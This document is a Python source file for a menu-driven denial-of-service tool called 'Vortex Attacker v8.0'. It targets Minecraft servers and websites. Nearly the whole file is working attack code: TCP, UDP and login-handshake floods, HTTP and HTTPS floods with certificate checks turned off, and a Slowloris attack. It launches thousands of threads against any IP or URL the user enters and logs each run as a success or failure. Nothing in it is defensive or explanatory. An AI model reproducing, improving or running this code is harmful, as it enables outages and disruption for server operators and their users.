#!/usr/bin/env python3
# VORTEX ATTACKER v8.0 - Minecraft + Website DDoS
# Features: Live logs, Success/Error tracking, Clean interface

import socket
import threading
import random
import time
import os
import json
from datetime import datetime

VERSION = "8.0"

# Colors
GREEN = "\033[92m"
RED = "\033[91m"
YELLOW = "\033[93m"
BLUE = "\033[94m"
CYAN = "\033[96m"
RESET = "\033[0m"
BOLD = "\033[1m"

LOG_FILE = "attack_logs.json"

def clear_screen():
    os.system('clear')

def banner():
    print(BOLD + CYAN + r"""
╔══════════════════════════════════════════════════════════════╗
║                                                              ║
║    ██╗   ██╗ ██████╗ ██████╗ ████████╗███████╗██╗  ██╗     ║
║    ██║   ██║██╔═══██╗██╔══██╗╚══██╔══╝██╔════╝╚██╗██╔╝     ║
║    ██║   ██║██║   ██║██████╔╝   ██║   █████╗   ╚███╔╝      ║
║    ╚██╗ ██╔╝██║   ██║██╔══██╗   ██║   ██╔══╝   ██╔██╗      ║
║     ╚████╔╝ ╚██████╔╝██║  ██║   ██║   ███████╗██╔╝ ██╗     ║
║      ╚═══╝   ╚═════╝ ╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝     ║
║                                                              ║
║         VORTEX ATTACKER v8.0 - CLEAN EDITION                ║
║           Minecraft + Website DDoS Only                     ║
╚══════════════════════════════════════════════════════════════╝
""" + RESET)

def save_log(log_data):
    logs = []
    if os.path.exists(LOG_FILE):
        try:
            with open(LOG_FILE, "r") as f:
                logs = json.load(f)
        except:
            logs = []
    logs.append(log_data)
    # Keep last 50 logs
    if len(logs) > 50:
        logs = logs[-50:]
    with open(LOG_FILE, "w") as f:
        json.dump(logs, f, indent=2)

def show_live_logs():
    clear_screen()
    banner()
    print(BLUE + "\n[ LIVE ATTACK LOGS ]\n" + RESET)
    
    if os.path.exists(LOG_FILE):
        with open(LOG_FILE, "r") as f:
            logs = json.load(f)
        if logs:
            for log in reversed(logs[-15:]):
                status_color = GREEN if log['status'] == 'SUCCESS' else RED
                print(f"[{log['timestamp']}] {log['target']}:{log['port']} | {log['method']} | {status_color}{log['status']}{RESET} | Packets: {log.get('packets', 0)}")
        else:
            print("No logs yet. Run an attack first.")
    else:
        print("No logs yet. Run an attack first.")
    
    input("\nPress Enter...")

def resolve_domain(domain):
    try:
        ip = socket.gethostbyname(domain)
        print(GREEN + f"[✓] {domain} → {ip}" + RESET)
        return ip
    except:
        print(RED + f"[✗] Cannot resolve {domain}" + RESET)
        return None

def check_port(ip, port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(2)
        result = sock.connect_ex((ip, port))
        sock.close()
        return result == 0
    except:
        return False

# ============ MINECRAFT ATTACKS ============

def minecraft_java_flood(ip, port, stop_event, stats):
    """TCP flood for Minecraft Java servers (port 25565)"""
    while not stop_event.is_set():
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.3)
            sock.connect((ip, port))
            sock.send(b"\x00" * 32)
            sock.close()
            stats['packets'] += 1
        except:
            stats['errors'] += 1

def minecraft_bedrock_flood(ip, port, stop_event, stats):
    """UDP flood for Minecraft Bedrock servers (port 19132)"""
    data = random._urandom(1024)
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while not stop_event.is_set():
        try:
            sock.sendto(data, (ip, port))
            stats['packets'] += 1
        except:
            stats['errors'] += 1

def minecraft_handshake_flood(ip, port, stop_event, stats):
    """Handshake flood - keeps servers busy with login attempts"""
    while not stop_event.is_set():
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.5)
            sock.connect((ip, port))
            # Minecraft handshake packet
            packet = b'\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
            sock.send(packet)
            sock.close()
            stats['packets'] += 1
        except:
            stats['errors'] += 1

# ============ WEBSITE ATTACKS ============

def website_http_flood(url, stop_event, stats):
    """HTTP flood for websites"""
    import urllib.request
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Connection': 'keep-alive'
    }
    req = urllib.request.Request(url, headers=headers)
    while not stop_event.is_set():
        try:
            urllib.request.urlopen(req, timeout=3)
            stats['packets'] += 1
        except:
            stats['errors'] += 1

def website_https_flood(url, stop_event, stats):
    """HTTPS flood (more resource intensive for server)"""
    import urllib.request
    import ssl
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
    req = urllib.request.Request(url, headers=headers)
    while not stop_event.is_set():
        try:
            urllib.request.urlopen(req, timeout=3, context=ctx)
            stats['packets'] += 1
        except:
            stats['errors'] += 1

def slowloris_attack(ip, port, stop_event, stats):
    """Slowloris - keeps connections open"""
    sockets = []
    while not stop_event.is_set():
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(4)
            sock.connect((ip, port))
            sock.send(b"GET / HTTP/1.1\r\nHost: " + ip.encode() + b"\r\n\r\n")
            sockets.append(sock)
            stats['packets'] += 1
            if len(sockets) > 300:
                sockets.pop(0).close()
        except:
            stats['errors'] += 1

# ============ MINECRAFT MENU ============

def minecraft_attack():
    clear_screen()
    banner()
    print(BLUE + "\n[ MINECRAFT SERVER DDoS ]\n" + RESET)
    
    target = input(YELLOW + "Enter IP or Domain: " + RESET)
    
    # Resolve domain
    if not target.replace('.', '').isdigit():
        ip = resolve_domain(target)
        if not ip:
            input("Press Enter...")
            return
    else:
        ip = target
    
    # Port selection
    print("\n" + CYAN + "[ PORT SELECTION ]" + RESET)
    print("1. Minecraft Java (25565)")
    print("2. Minecraft Bedrock (19132)")
    print("3. Custom Port")
    port_choice = input("Select (1-3): ")
    
    if port_choice == "1":
        port = 25565
    elif port_choice == "2":
        port = 19132
    else:
        port = int(input("Enter custom port: "))
    
    # Check server
    print(f"\n[+] Checking {ip}:{port}...")
    if check_port(ip, port):
        print(GREEN + f"[✓] Server is ONLINE" + RESET)
    else:
        print(RED + f"[✗] Server is OFFLINE" + RESET)
        proceed = input("Continue anyway? (y/n): ")
        if proceed.lower() != 'y':
            return
    
    # Attack method
    print("\n" + CYAN + "[ ATTACK METHODS ]" + RESET)
    print("1. TCP Flood (Best for Java)")
    print("2. UDP Flood (Best for Bedrock)")
    print("3. Handshake Flood (Login spam)")
    
    method_choice = input("Select (1-3): ")
    
    if method_choice == "1":
        attack_func = minecraft_java_flood
        method_name = "TCP_FLOOD"
    elif method_choice == "2":
        attack_func = minecraft_bedrock_flood
        method_name = "UDP_FLOOD"
    else:
        attack_func = minecraft_handshake_flood
        method_name = "HANDSHAKE_FLOOD"
    
    # Settings
    threads = int(input(YELLOW + "\nThreads (1000-10000, default 3000): " + RESET) or 3000)
    duration = int(input(YELLOW + "Duration in seconds (default 60): " + RESET) or 60)
    
    # Confirm
    print(RED + "\n" + "="*50)
    print(f"  TARGET: {ip}:{port}")
    print(f"  METHOD: {method_name}")
    print(f"  THREADS: {threads}")
    print(f"  DURATION: {duration} seconds")
    print("="*50 + RESET)
    
    confirm = input("\nStart attack? (y/n): ")
    if confirm.lower() != 'y':
        return
    
    # Start attack
    stop_event = threading.Event()
    stats = {'packets': 0, 'errors': 0}
    
    print(GREEN + f"\n[🔥] ATTACK STARTED on {ip}:{port}" + RESET)
    print(CYAN + "[!] Press Ctrl+C to stop\n" + RESET)
    
    # Launch threads
    for _ in range(threads):
        t = threading.Thread(target=attack_func, args=(ip, port, stop_event, stats))
        t.daemon = True
        t.start()
    
    # Live log monitor
    start_time = time.time()
    try:
        while time.time() - start_time < duration:
            elapsed = int(time.time() - start_time)
            remaining = duration - elapsed
            # Live status update
            print(f"\r[LIVE] Packets: {stats['packets']} | Errors: {stats['errors']} | Time left: {remaining}s    ", end="")
            time.sleep(1)
        
        stop_event.set()
        time.sleep(1)
        
        # Save log
        status = "SUCCESS" if stats['packets'] > 0 else "FAILED"
        save_log({
            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "target": ip,
            "port": port,
            "method": method_name,
            "threads": threads,
            "duration": duration,
            "packets": stats['packets'],
            "errors": stats['errors'],
            "status": status
        })
        
        print(GREEN + f"\n\n[✓] ATTACK FINISHED" + RESET)
        print(f"[📊] Packets sent: {stats['packets']}")
        print(f"[⚠️] Errors: {stats['errors']}")
        
        if stats['packets'] > 0:
            print(GREEN + "[✓] Attack SUCCESSFUL - Check target for lag" + RESET)
        else:
            print(RED + "[✗] Attack FAILED - Target may be protected" + RESET)
            
    except KeyboardInterrupt:
        stop_event.set()
        print(YELLOW + f"\n\n[!] Attack stopped early" + RESET)
        print(f"[📊] Packets sent: {stats['packets']}")
    
    input("\nPress Enter...")

# ============ WEBSITE MENU ============

def website_attack():
    clear_screen()
    banner()
    print(BLUE + "\n[ WEBSITE DDoS ]\n" + RESET)
    
    url = input(YELLOW + "Enter URL (https://example.com): " + RESET)
    
    # Extract domain for Slowloris
    domain = url.replace("https://", "").replace("http://", "").split("/")[0]
    
    try:
        ip = socket.gethostbyname(domain)
        print(GREEN + f"[✓] Domain resolved to {ip}" + RESET)
    except:
        print(RED + "[✗] Cannot resolve domain" + RESET)
        input("Press Enter...")
        return
    
    # Check if website is reachable
    try:
        import urllib.request
        urllib.request.urlopen(url, timeout=3)
        print(GREEN + "[✓] Website is ONLINE" + RESET)
    except:
        print(RED + "[✗] Website is OFFLINE or unreachable" + RESET)
        proceed = input("Continue anyway? (y/n): ")
        if proceed.lower() != 'y':
            return
    
    # Attack method
    print("\n" + CYAN + "[ ATTACK METHODS ]" + RESET)
    print("1. HTTP Flood (Port 80)")
    print("2. HTTPS Flood (Port 443)")
    print("3. Slowloris (Keep connections open)")
    
    method_choice = input("Select (1-3): ")
    
    if method_choice == "1":
        attack_func = website_http_flood
        method_name = "HTTP_FLOOD"
        # Convert to HTTP if HTTPS given
        url = url.replace("https://", "http://")
    elif method_choice == "2":
        attack_func = website_https_flood
        method_name = "HTTPS_FLOOD"
    else:
        attack_func = slowloris_attack
        method_name = "SLOWLORIS"
        port = 80 if url.startswith("http://") else 443
    
    # Settings
    threads = int(input(YELLOW + "\nThreads (1000-10000, default 3000): " + RESET) or 3000)
    duration = int(input(YELLOW + "Duration in seconds (default 60): " + RESET) or 60)
    
    # Confirm
    print(RED + "\n" + "="*50)
    print(f"  TARGET: {url}")
    print(f"  METHOD: {method_name}")
    print(f"  THREADS: {threads}")
    print(f"  DURATION: {duration} seconds")
    print("="*50 + RESET)
    
    confirm = input("\nStart attack? (y/n): ")
    if confirm.lower() != 'y':
        return
    
    # Start attack
    stop_event = threading.Event()
    stats = {'packets': 0, 'errors': 0}
    
    print(GREEN + f"\n[🔥] WEBSITE ATTACK STARTED on {url}" + RESET)
    print(CYAN + "[!] Press Ctrl+C to stop\n" + RESET)
    
    # Launch threads based on method
    if method_choice == "3":
        # Slowloris uses IP and port
        for _ in range(threads):
            t = threading.Thread(target=attack_func, args=(ip, port, stop_event, stats))
            t.daemon = True
            t.start()
    else:
        for _ in range(threads):
            t = threading.Thread(target=attack_func, args=(url, stop_event, stats))
            t.daemon = True
            t.start()
    
    # Live log monitor
    start_time = time.time()
    try:
        while time.time() - start_time < duration:
            elapsed = int(time.time() - start_time)
            remaining = duration - elapsed
            print(f"\r[LIVE] Requests: {stats['packets']} | Errors: {stats['errors']} | Time left: {remaining}s    ", end="")
            time.sleep(1)
        
        stop_event.set()
        time.sleep(1)
        
        # Save log
        status = "SUCCESS" if stats['packets'] > 0 else "FAILED"
        save_log({
            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "target": url,
            "port": 443 if method_choice == "2" else 80,
            "method": method_name,
            "threads": threads,
            "duration": duration,
            "packets": stats['packets'],
            "errors": stats['errors'],
            "status": status
        })
        
        print(GREEN + f"\n\n[✓] ATTACK FINISHED" + RESET)
        print(f"[📊] Requests sent: {stats['packets']}")
        print(f"[⚠️] Errors: {stats['errors']}")
        
        if stats['packets'] > 0:
            print(GREEN + "[✓] Attack SUCCESSFUL - Check website response" + RESET)
        else:
            print(RED + "[✗] Attack FAILED - Target may be protected" + RESET)
            
    except KeyboardInterrupt:
        stop_event.set()
        print(YELLOW + f"\n\n[!] Attack stopped early" + RESET)
        print(f"[📊] Requests sent: {stats['packets']}")
    
    input("\nPress Enter...")

# ============ MAIN MENU ============

def main_menu():
    while True:
        clear_screen()
        banner()
        
        print(PURPLE + """
╔════════════════════════════════════════════════════════════╗
║                        MAIN MENU                          ║
╠════════════════════════════════════════════════════════════╣
║                                                            ║
║    ╔══════════════════════════════════════════════════╗   ║
║    ║  1. MINECRAFT SERVER DDoS                        ║   ║
║    ║     Attack Minecraft Java or Bedrock servers     ║   ║
║    ╚══════════════════════════════════════════════════╝   ║
║                                                            ║
║    ╔══════════════════════════════════════════════════╗   ║
║    ║  2. WEBSITE DDoS                                 ║   ║
║    ║     Attack websites (HTTP/HTTPS)                 ║   ║
║    ╚══════════════════════════════════════════════════╝   ║
║                                                            ║
║    ╔══════════════════════════════════════════════════╗   ║
║    ║  3. VIEW ATTACK LOGS                             ║   ║
║    ║     See past attacks with success/failure        ║   ║
║    ╚══════════════════════════════════════════════════╝   ║
║                                                            ║
║    ╔══════════════════════════════════════════════════╗   ║
║    ║  4. EXIT                                          ║   ║
║    ╚══════════════════════════════════════════════════╝   ║
║                                                            ║
╚════════════════════════════════════════════════════════════╝
""" + RESET)
        
        choice = input(YELLOW + "Select (1-4): " + RESET)
        
        if choice == "1":
            minecraft_attack()
        elif choice == "2":
            website_attack()
        elif choice == "3":
            show_live_logs()
        elif choice == "4":
            print(GREEN + "\n[✓] Exiting Vortex Attacker..." + RESET)
            sys.exit(0)

if __name__ == "__main__":
    try:
        main_menu()
    except KeyboardInterrupt:
        print(YELLOW + "\n\n[!] Exiting..." + RESET)
        sys.exit(0)
